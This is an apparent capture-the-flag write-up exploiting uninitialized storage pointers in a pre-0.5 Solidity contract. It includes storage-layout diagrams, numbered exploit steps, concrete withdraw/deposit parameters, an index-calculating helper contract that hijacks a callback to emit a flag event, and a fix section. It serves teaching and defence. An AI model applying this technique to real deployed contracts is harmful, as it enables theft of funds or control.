## analyses

In this challenge, our goal is to emit the `SendFlag` event. The uninitialized storage pointer `info` at line 32 allows us to overwrite the length of `safeboxes` to a large value, making `safeboxes` overlap with `failedLogs`. Thus, we can control the `callback` variable by `triedPass` in a `FailedAttempt`, and hijack the program flow to jump directly to the instruction where the `SendFlag` event is emitted.

Following the game contract’s logic, we may notice that `SendFlag` can be emitted only from the callback function `sendFlag()`, which happens if the safebox is deposited by the `owner`, the contract creator. However, the owner will not interact with the game contract after it was deployed, so we must exploit some vulnerabilities in the game contract to reach our goal.

To solve this level, we should know: If we execute an anonymous function in a struct, it will jump based on the content in the anonymous function. For instance: box.callback(id,pass) will jump to the positon that storage in EVM.

```
struct SafeBox {
        bool done;
        function(uint, bytes12) internal callback;
        bytes12 hash;
        uint value;
    }
.....
SafeBox box;
box.callback(idx, pass);
```

### Finding the Bug

After compiling the game contract in [Remix](https://remix.ethereum.org/) (or other IDEs), several warnings popped out:

```
browser/Bank.sol:32:13: Warning: Uninitialized storage pointer. Did you mean ‘<type> memory info’?
FailedAttempt info;
^—————-^
```

```
browser/Bank.sol:45:9: Warning: Uninitialized storage pointer. Did you mean ‘<type> memory box’?
SafeBox box;
^———^
```

That is, `info` at line 32 and `box` at line 45 are **uninitialized storage pointers**. In Solidity < v0.5.0, the default data location for variables of structs and arrays is `storage` ([Ref](https://solidity.readthedocs.io/en/v0.4.24/types.html#data-location)). If these variables are not declared with an initial value, they point to slot 0 in the storage by default, causing that data in slot 0 (or the next few slots) is overwritten when writing to these variables (or to the members of them).

### Exploiting the Uninitialized Storage Pointers

Back to the game contract. When the contract is created, the variables stored at slot 0 to 3 are as follow:

```
-----------------------------------------------------
|     unused (12)     |          owner (20)         | <- slot 0
-----------------------------------------------------
|                 randomNumber (32)                 | <- slot 1
-----------------------------------------------------
|               safeboxes.length (32)               | <- slot 2
-----------------------------------------------------
|       occupied by failedLogs but unused (32)      | <- slot 3
-----------------------------------------------------
```

According to the structure of `FailedAttempt`, its layout in the storage is:

```
-----------------------------------------------------
|                      idx (32)                     |
-----------------------------------------------------
|                     time (32)                     |
-----------------------------------------------------
|          origin (20)         |   triedPass (12)   |
-----------------------------------------------------
```

At line 33 to 36, since `info` is uninitialized and points to slot 0, modifying the members of `info` leads to overwriting the values at slot 0 to 2. Similarly, the layout `SafeBox` is,

```
-----------------------------------------------------
| unused (11) | hash (12) | callback (8) | done (1) |
-----------------------------------------------------
|                     value (32)                    |
-----------------------------------------------------
```

and, in the function `deposit()`, slot 0 and 1 is overwritten by the members of `box`.

Notice that modifying slots 0 and 1, where the value of `owner` and `randomNumber` is stored respectively, is useless. Since even if we overwrite `owner` to our address, we should pass the check at line 74. However, if `tx.origin` is large enough, modifying the length of `safeboxes` can make it overlap with `failedLogs`. This happens with a probability of 1/2, depending on the value of `tx.origin`.

### Controlling the Flow

Now, assume that `safeboxes` overlaps with `failedLogs`, and the `callback` of a `Safebox` element overlaps with the `triedPass` of a `FailedAttempt` element. Since `triedPass` is completely controlled by us, we can overwrite `callback` and further control the program flow (at line 64) by calling `withdraw()` with the corresponding index of the overlapped safebox element.

Calling internal functions in a contract is identical to executing a `JUMP` operation. Notice that EVM only allows us to jump to a `JUMPDEST` instruction. By inspecting the assembly code of the game contract, we can notice that jumping to the instruction `0x70f` is exactly what we want. After the jump, the program continues to execute at line 75, emits the `SendFlag` event, and stops after executing the selfdestruct instruction.

So, this is our full exploit:

1. Calculate `target = keccak256(keccak256(msg.sender||3)) + 2`.
2. Calculate `base = keccak256(2)`.
3. Calculate `idx = (target - base) // 2`.
4. If `(target - base) % 2 == 1`, then `idx += 2`, and do step 7 twice. This happens when the `triedPass` of the first element of `failedLogs` does not overlap with the `callback` variable, so we choose the second element instead. For ease of problem-solving, we only consider that `(target - base) % 2 == 0`.
5. If `(msg.sender << (12*8)) < idx`, then choose another player account, and restart from step 1. This happens when the overwritten length of `safeboxes` is not large enough to overlap with `failedLogs`.(the safeboxes' length should greater than idx, or it doesn't overlap the failedLogs)
6. Call `deposit(0x000000000000000000000000)` with 1 ether.
7. Call `withdraw(0, triedPass)`.
8. Call `withdraw(idx, any)`, and the `SendFlag` event will be emitted.

## solve

1.put the contract into remix and get bytecode. Attention! the bytecode remix providing is consist of initcode and runtimecode, we only need runtimecode. So we should delete the content from the first 6080 to the second 6080. Because only the runtimecode will be deployed in EVM.

2.decomplie the runtimecode

![](https://moe.photo/images/2023/06/23/image-20230623192649582.png)

3.Call `deposit(0x000000000000000000000000)` with 1 ether.

4.Call `withdraw(0,0x111111000000000000075200)`.

5.calculate the idx: I use this EOA: 0xa8008e8a697d416EFDC227169ABE86fd579E197e in Ganache

- target(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 0x87514589ce108cb2546817ef911709e5cba72d30b256cec09501ab6641ed19aa
- base = 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace
- ZeroIsPerfect(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 0
- idx(0xa8008e8a697d416EFDC227169ABE86fd579E197e) = 16051576312513365899836508591052638300203044566877098313835095392794399268719

```solidity
contract cal{
    function target(address _addr)public pure returns(bytes32){
        return keccak256(keccak256(abi.encodePacked(bytes32(_addr),bytes32(3))));
    }
    function base() public pure returns(bytes32){
        return keccak256(bytes32(2));
    }
    function idx(address _addr) public pure returns(uint256 idx){
        return (uint256(target(_addr)) + 2 - uint256(base())) / 2;
    }
    function ZeroIsPerfect(address _addr) public pure returns(uint256){
        return (uint256(target(_addr)) + 2 - uint256(base())) % 2;
    }
}
```

And the safeboxes' length is greater than idx

6.Call `withdraw(idx, any)`, and the `SendFlag` event will be emitted.

## repair

To fix the bugs in the game contract, the data location of `info` and `box` should be explicitly declared as `memory`. Starting from Solidity v5.0.0, explicit data location for all variables of the struct, array or mapping types is mandatory ([Ref](https://solidity.readthedocs.io/en/v0.5.0/050-breaking-changes.html#explicitness-requirements)).
